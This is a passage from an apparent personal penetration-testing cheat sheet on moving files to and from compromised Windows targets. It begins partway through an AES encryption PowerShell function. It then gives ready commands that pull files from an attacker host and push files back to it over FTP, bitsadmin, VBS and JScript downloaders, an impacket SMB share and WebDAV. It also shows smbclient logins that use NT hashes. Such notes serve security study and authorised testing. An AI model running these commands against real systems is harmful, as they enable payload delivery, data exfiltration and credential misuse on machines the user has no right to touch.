                </span><span class="nv">$decryptor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">CreateDecryptor</span><span class="p">()</span><span class="w">
                </span><span class="nv">$decryptedBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$decryptor</span><span class="o">.</span><span class="nf">TransformFinalBlock</span><span class="p">(</span><span class="nv">$cipherBytes</span><span class="p">,</span><span class="w"> </span><span class="nx">16</span><span class="p">,</span><span class="w"> </span><span class="nv">$cipherBytes</span><span class="o">.</span><span class="nf">Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">16</span><span class="p">)</span><span class="w">
                </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Dispose</span><span class="p">()</span><span class="w">

                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Text</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="kr">return</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">UTF8.GetString</span><span class="p">(</span><span class="nv">$decryptedBytes</span><span class="p">)</span><span class="o">.</span><span class="nf">Trim</span><span class="p">([</span><span class="n">char</span><span class="p">]</span><span class="nx">0</span><span class="p">)}</span><span class="w">

                </span><span class="kr">if</span><span class="w"> </span><span class="p">(</span><span class="nv">$Path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
                    </span><span class="p">[</span><span class="n">System.IO.File</span><span class="p">]::</span><span class="n">WriteAllBytes</span><span class="p">(</span><span class="nv">$outPath</span><span class="p">,</span><span class="w"> </span><span class="nv">$decryptedBytes</span><span class="p">)</span><span class="w">
                    </span><span class="p">(</span><span class="n">Get-Item</span><span class="w"> </span><span class="nv">$outPath</span><span class="p">)</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$File</span><span class="o">.</span><span class="nf">LastWriteTime</span><span class="w">
                    </span><span class="kr">return</span><span class="w"> </span><span class="s2">"File decrypted to </span><span class="nv">$outPath</span><span class="s2">"</span><span class="w">
                </span><span class="p">}</span><span class="w">
            </span><span class="p">}</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">}</span><span class="w">

    </span><span class="kr">End</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nv">$shaManaged</span><span class="o">.</span><span class="nf">Dispose</span><span class="p">()</span><span class="w">
        </span><span class="nv">$aesManaged</span><span class="o">.</span><span class="nf">Dispose</span><span class="p">()</span><span class="w">
    </span><span class="p">}</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div>

<p>once copied and transferred on the target, we can import it with <code>Import-Module .\Invoke-AESEncryption.ps1</code> and use it this way:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">Invoke-AESEncryption</span><span class="w"> </span><span class="nt">-Mode</span><span class="w"> </span><span class="nx">Encrypt</span><span class="w"> </span><span class="nt">-Key</span><span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="o">.</span><span class="nx">\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h2>FTP</h2>

<p>good old FTP works too.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># on your attack box, start a FTP server with pyftpdlib</span>
python3 <span class="nt">-m</span> pyftpdlib <span class="nt">--port</span> 21
</code></pre></div>

<p>then on the windows target, run:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'ftp://&lt;attack box IP&gt;/&lt;filename&gt;'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Users\Public\&lt;filename&gt;'</span><span class="p">)</span><span class="w">
</span></code></pre></div>

<p>if we don&#39;t have an interactive shell on our target, we can create and execute a file with all of our commands inside:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">echo</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">USER</span><span class="w"> </span><span class="nx">anonymous</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">binary</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">GET</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">bye</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">ftp</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nt">-s</span><span class="p">:</span><span class="nx">ftpcommand.txt</span><span class="w">
</span></code></pre></div>

<p>for upload operations, start a server on your attack box:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># the --write flag will allow clients to upload files</span>
python3 <span class="nt">-m</span> pyftpdlib <span class="nt">--port</span> 21 <span class="nt">--write</span>
</code></pre></div>

<p>then on the windows target, run:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">UploadFile</span><span class="p">(</span><span class="s1">'ftp://&lt;attack box IP&gt;/ftp-hosts'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\Windows\&lt;filename&gt;'</span><span class="p">)</span><span class="w">
</span></code></pre></div>

<p>if we don&#39;t have an interactive shell, we can create a file like earlier:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">echo</span><span class="w"> </span><span class="nx">open</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">USER</span><span class="w"> </span><span class="nx">anonymous</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">binary</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">PUT</span><span class="w"> </span><span class="nx">c:\windows\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">bye</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">ftpcommand.txt</span><span class="w">
</span><span class="n">ftp</span><span class="w"> </span><span class="nt">-v</span><span class="w"> </span><span class="nt">-n</span><span class="w"> </span><span class="nt">-s</span><span class="p">:</span><span class="nx">ftpcommand.txt</span><span class="w">
</span></code></pre></div>

<h2>bitsadmin</h2>

<p>background intelligent transfer service can be used too. never had to use it so far, but who knows.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">bitsadmin</span><span class="w"> </span><span class="nx">/transfer</span><span class="w"> </span><span class="nx">job</span><span class="w"> </span><span class="nx">/download</span><span class="w"> </span><span class="nx">/priority</span><span class="w"> </span><span class="nx">high</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">IP</span><span class="err">&gt;</span><span class="p">:</span><span class="err">&lt;</span><span class="nx">port</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">output_filename</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h2>VBS script</h2>

<p>very useful if nothing else is available (powershell, samba, etc). transfer is slow but works reliably.</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># copy and paste the following lines from your shell to create a wget.vbs script</span><span class="w">

</span><span class="n">echo</span><span class="w"> </span><span class="nx">strUrl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WScript.Arguments.Item</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">StrFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WScript.Arguments.Item</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">Const</span><span class="w"> </span><span class="nx">HTTPREQUEST_PROXYSETTING_DEFAULT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">Const</span><span class="w"> </span><span class="nx">HTTPREQUEST_PROXYSETTING_PRECONFIG</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">Const</span><span class="w"> </span><span class="nx">HTTPREQUEST_PROXYSETTING_DIRECT</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">Const</span><span class="w"> </span><span class="nx">HTTPREQUEST_PROXYSETTING_PROXY</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">Dim</span><span class="w"> </span><span class="nx">http</span><span class="p">,</span><span class="w"> </span><span class="nx">varByteArray</span><span class="p">,</span><span class="w"> </span><span class="nx">strData</span><span class="p">,</span><span class="w"> </span><span class="nx">strBuffer</span><span class="p">,</span><span class="w"> </span><span class="nx">lngCounter</span><span class="p">,</span><span class="w"> </span><span class="nx">fs</span><span class="p">,</span><span class="w"> </span><span class="nx">ts</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">Err.Clear</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Nothing</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"WinHttp.WinHttpRequest.5.1"</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">If</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="nx">Is</span><span class="w"> </span><span class="nx">Nothing</span><span class="w"> </span><span class="nx">Then</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"WinHttp.WinHttpRequest"</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">If</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="nx">Is</span><span class="w"> </span><span class="nx">Nothing</span><span class="w"> </span><span class="nx">Then</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"MSXML2.ServerXMLHTTP"</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">If</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="nx">Is</span><span class="w"> </span><span class="nx">Nothing</span><span class="w"> </span><span class="nx">Then</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"Microsoft.XMLHTTP"</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">http.Open</span><span class="w"> </span><span class="s2">"GET"</span><span class="p">,</span><span class="w"> </span><span class="nx">strURL</span><span class="p">,</span><span class="w"> </span><span class="nx">False</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">http.Send</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">varByteArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">http.ResponseBody</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">http</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Nothing</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">fs</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CreateObject</span><span class="p">(</span><span class="s2">"Scripting.FileSystemObject"</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">ts</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">fs.CreateTextFile</span><span class="p">(</span><span class="n">StrFile</span><span class="p">,</span><span class="w"> </span><span class="nx">True</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">strData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">strBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="n">wget.vbs</span><span class="w">
</span><span class="nx">echo</span><span class="w"> </span><span class="nx">For</span><span class="w"> </span><span class="nx">lngCounter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="nx">UBound</span><span class="p">(</span><span class="n">varByteArray</span><span class="p">)</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">ts.Write</span><span class="w"> </span><span class="nx">Chr</span><span class="p">(</span><span class="mi">255</span><span class="w"> </span><span class="n">And</span><span class="w"> </span><span class="nx">Ascb</span><span class="p">(</span><span class="n">Midb</span><span class="p">(</span><span class="n">varByteArray</span><span class="p">,</span><span class="nx">lngCounter</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">1</span><span class="p">,</span><span class="w"> </span><span class="nx">1</span><span class="p">)))</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">Next</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">
</span><span class="n">echo</span><span class="w"> </span><span class="nx">ts.Close</span><span class="w"> </span><span class="err">&gt;&gt;</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w">

</span><span class="c"># then, call the script to GET things from your webserver</span><span class="w">
</span><span class="n">cscript</span><span class="w"> </span><span class="nx">/nologo</span><span class="w"> </span><span class="nx">wget.vbs</span><span class="w"> </span><span class="nx">http://</span><span class="err">&lt;</span><span class="nx">attacker-ip</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">output-filename</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<p>here&#39;s an alternative script, also in VBS that can be used the same way with <code>cscript</code>:</p>

<div class="highlight"><pre class="highlight plaintext"><code>dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
</code></pre></div>

<h2>javascript</h2>

<p>we can create a js file that acts as a minimalist <code>wget</code> to download files on windows:</p>

<div class="highlight"><pre class="highlight javascript"><code><span class="kd">var</span> <span class="nx">WinHttpReq</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">WinHttp.WinHttpRequest.5.1</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">WinHttpReq</span><span class="p">.</span><span class="nc">Open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">WScript</span><span class="p">.</span><span class="nc">Arguments</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="cm">/*async=*/</span><span class="kc">false</span><span class="p">);</span>
<span class="nx">WinHttpReq</span><span class="p">.</span><span class="nc">Send</span><span class="p">();</span>
<span class="nx">BinStream</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ActiveXObject</span><span class="p">(</span><span class="dl">"</span><span class="s2">ADODB.Stream</span><span class="dl">"</span><span class="p">);</span>
<span class="nx">BinStream</span><span class="p">.</span><span class="nx">Type</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
<span class="nx">BinStream</span><span class="p">.</span><span class="nc">Open</span><span class="p">();</span>
<span class="nx">BinStream</span><span class="p">.</span><span class="nc">Write</span><span class="p">(</span><span class="nx">WinHttpReq</span><span class="p">.</span><span class="nx">ResponseBody</span><span class="p">);</span>
<span class="nx">BinStream</span><span class="p">.</span><span class="nc">SaveToFile</span><span class="p">(</span><span class="nx">WScript</span><span class="p">.</span><span class="nc">Arguments</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
</code></pre></div>

<p>you can then execute it with:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="n">cscript.exe</span><span class="w"> </span><span class="nx">/nologo</span><span class="w"> </span><span class="nx">wget.js</span><span class="w"> </span><span class="nx">https://</span><span class="err">&lt;</span><span class="nx">domain</span><span class="w"> </span><span class="nx">name</span><span class="w"> </span><span class="nx">or</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">/</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w">
</span></code></pre></div>

<h2>samba</h2>

<p>don&#39;t fight it if it&#39;s available. just use it.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># if you already have a shell on your target, hosting your own share is a good way of transferring files:</span>
impacket-smbserver share <span class="nb">.</span> <span class="c"># to share the current directory</span>
<span class="c"># you might need to enable SMB2 support depending on the target</span>
impacket-smbserver <span class="nt">-smb2support</span> share <span class="nb">.</span>
<span class="c"># you might also need to add a username and password if unauthenticated guest access is blocked on the target</span>
impacket-smbserver <span class="nt">-smb2support</span> <span class="nt">-user</span> <span class="nb">test</span> <span class="nt">-password</span> <span class="nb">test </span>share <span class="nb">.</span>

<span class="c"># then on the target, check if you can see the created share</span>
net view <span class="se">\\</span>&lt;attacker-ip&gt;
<span class="nb">dir</span> <span class="se">\\</span>&lt;attacker-ip&gt;<span class="se">\s</span>hare

<span class="c"># mount the smb server with username and password, if required</span>
net use n: <span class="se">\\</span>&lt;attack box IP&gt;<span class="se">\s</span>hare /user:test <span class="nb">test</span>

<span class="c"># copy files from your share (replace with n:\&lt;...&gt; if you mounted the share)</span>
copy <span class="se">\\</span>&lt;attacker-ip&gt;<span class="se">\s</span>hare<span class="se">\&lt;</span>filename&gt; <span class="nb">.</span>

<span class="c"># or copy files from the target to your attack box</span>
copy &lt;filename&gt; <span class="se">\\</span>&lt;attacker-ip&gt;<span class="se">\s</span>hare<span class="se">\&lt;</span>filename&gt;

<span class="c"># if you don't have a shell on your target, you can still try to log in with smbclient:</span>
<span class="c"># login as guest, if available</span>
smbclient <span class="nt">-N</span> //&lt;target-ip&gt;/&lt;share-name&gt; <span class="nt">-U</span> <span class="s2">""</span>

<span class="c"># login with specific user and their hash</span>
smbclient //&lt;target-ip&gt;/&lt;share-name&gt; <span class="nt">-U</span> <span class="s2">"&lt;username&gt;"</span> <span class="nt">--pw-nt-hash</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span>

<span class="c"># same command but with workgroup specified</span>
smbclient //&lt;target-ip&gt;/&lt;share-name&gt; <span class="nt">-U</span> <span class="s2">"&lt;username&gt;"</span> <span class="nt">--pw-nt-hash</span> &lt;<span class="nb">hash</span><span class="o">&gt;</span> <span class="nt">-W</span> &lt;workgroup-name&gt;
</code></pre></div>

<p>if the SMB protocol isn&#39;t allowed outside of the target&#39;s internal network, we can still try to use SMB over HTTP with webdav, which essentially turns a HTTP webserver into a fileserver. this is what SMB will try to connect to if there&#39;s no SMB share available through the SMB protocol.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># you have to install wsgidav and cheroot through pip3 first</span>
wsgidav <span class="nt">--host</span><span class="o">=</span>0.0.0.0 <span class="nt">--port</span><span class="o">=</span>80 <span class="nt">--root</span><span class="o">=</span>/tmp <span class="nt">--auth</span><span class="o">=</span>anonymous 
</code></pre></div>

<p>once the webdav server is running, access it from your target:</p>

<div class="highlight"><pre class="highlight powershell"><code><span class="c"># this share is a special keyword here</span><span class="w">
</span><span class="n">dir</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">\DavWWWRoot</span><span class="w">

</span><span class="c"># upload files with SMB</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">\DavWWWRoot\</span><span class="w">
</span><span class="n">copy</span><span class="w"> </span><span class="nx">C:\Users\</span><span class="err">&lt;</span><span class="nx">filename</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">\\</span><span class="err">&lt;</span><span class="nx">attack</span><span class="w"> </span><span class="nx">box</span><span class="w"> </span><span class="nx">IP</span><span class="err">&gt;</span><span class="nx">\sharefolder\</span><span class="w">
</span></code></pre></div>

<h2>living off the land binaries</h2>

<p>if everything else fails, check for alternatives on <a href="https://lolbas-project.github.io/" rel="nofollow">LOLBAS</a>. use <code>/download</code> or <code>/upload</code> keywords to find potential binaries.</p>

<h2>references</h2>

<ul>
<li><a href="https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/" rel="nofollow">https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/</a></li>
<li><a href="https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1" rel="nofollow">https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1</a></li>
</ul>

    
    </main>
    <footer id="footer">
      <div class="footer-section"><a href="/license/">CC BY-NC-SA 4.0</a><p>&nbsp;::&nbsp;2019 - 2025 ovelny</p></div>
      <div class="footer-section">「七転び八起き」</div>
    </footer>
  </body>
</html>

